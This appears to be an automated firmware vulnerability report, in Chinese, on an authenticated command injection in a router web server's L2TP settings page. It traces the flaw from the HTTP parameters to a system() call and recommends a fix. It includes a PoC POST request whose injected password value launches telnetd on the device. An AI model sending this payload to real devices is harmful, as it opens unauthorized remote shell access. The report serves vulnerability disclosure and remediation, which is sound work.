# 漏洞挖掘报告

## 一、任务信息

- 会话：s-mt87iubv-b93b
- 任务：沿高分攻击路径做动静结合挖掘，给出调用链和可复现 PoC。优先命令注入和内存破坏。
- 引擎：dsh（模式：dynamic）
- 固件任务：beb9836a7b28
- 轮次：1/80
- 报告时间：2026-08-25T08:20:38Z

## 二、发现统计

- 共 1 个漏洞：高危 1 个

## 三、动态验证

- 摘录最近 4 条 trace，其中非空差分 0 条。

- `39d3ea4fef37` ok_empty_diff via=net:53 差分函数 0
- `03e7766ec942` ok_empty_diff via=net:21 差分函数 0
- `5a77619de902` ok_empty_diff via=net:80 差分函数 0
- `9826e473e14d` ok_empty_diff via=net:80 差分函数 0

## 四、漏洞详情

### 漏洞 1：httpd L2TP 配置处理器命令注入（认证后，经 uclited system() 执行）（F-mt87vqye-7be2）

- **漏洞类型**：command-injection（CWE-78）
- **危害等级**：高危（置信度 0.6）
- **影响组件**：firmware/binwalk_extracted/firmware.extracted/0/squashfs-root/usr/bin/httpd（md5: 9582aa23b0bc2de099b9997b09457d01）
- **漏洞位置**：sub_4820C0 @ 0x4820c0
- **可达性**：static-only
- **漏洞描述**：httpd 的 L2TP 配置处理器 sub_4820C0（/userRpm/L2TPCfgRpm.htm）从 HTTP POST 参数 L2TPName、L2TPPwd 直接 strncpy 进 L2TP 配置结构（偏移 +284 用户名、+540 密码），未经任何 shell 元字符过滤（仅对 sta_ip/mask/gw/dns 做 swChkDotIpAddr、对服务器名做 swChkPptpL2tpLegalDomain）。配置经 swSetL2tpCfg 调 ucSetL2tpCfg + l2tpActiveCfg 写入共享配置，最终在 uclited 进程的 l2tpCmdReq 中调用 l2tpFormatCmd，将用户名/密码用 sprintf 拼入命令行 "xl2tpd -c /tmp/l2tpd.conf user \"%s\" password \"%s\" ..." 后执行 system()，造成命令注入（需已认证管理员触发 Connect/Save）。
- **漏洞证据**：
  1. httpd sub_4820C0 @ 0x4820c0: Env=httpGetEnv(a1,"L2TPName") strncpy((char*)&s[71], Env, 0xFF) （用户名，无过滤）
  2. 同函数 L2TPPwd: strncpy((char*)&s[135], v4, 0xFF) （密码，无过滤）
  3. sub_4820C0 → swSetL2tpCfg(s) @ httpd 0x4b7c30 → ucSetL2tpCfg(0,a1) + l2tpActiveCfg(a1)
  4. uclited l2tpCmdReq @ 0x44b3a8: pppSetWanParameter(...); l2tpFormatCmd(v2, byte_5450F4); system(byte_5450F4)
  5. uclited l2tpFormatCmd @ 0x44b748: sprintf(a2, "xl2tpd -c %s user \"%s\" password \"%s\" ", a1+284, a1+540) → 注入点

**调用链**：

httpDispatcher(0x425d08) → httpRpmConfAdd 路由 /userRpm/L2TPCfgRpm.htm → sub_4820C0(0x4820c0)[httpGetEnv L2TPName/L2TPPwd strncpy 到 +284/+540] → swSetL2tpCfg(0x4b7c30) → ucSetL2tpCfg + l2tpActiveCfg(0x44af48) → uclited l2tpCmdReq(0x44b3a8) → l2tpFormatCmd(0x44b748)[拼 system 命令] → system(byte_5450F4)

**漏洞 PoC**：

```
POST /userRpm/L2TPCfgRpm.htm?Save=save HTTP/1.1\r\nHost: 192.168.1.1\r\nCookie: <已认证会话>\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: <n>\r\n\r\nL2TPName=user;L2TPPwd=x%22;/bin/telnetd;%23&Connect=connect&IpType=1&L2TPServerName=l2tp.example.com
```

- **修复建议**：对 L2TPName/L2TPPwd 应用与域名一致的严格字符白名单校验（仅字母数字及 .-_ 等），或使用带参数数组的 execv 而非 system()/sprintf 拼接，杜绝 shell 元字符。理想做法是走 pppd/xl2tpd 参数数组接口，不经过 shell。
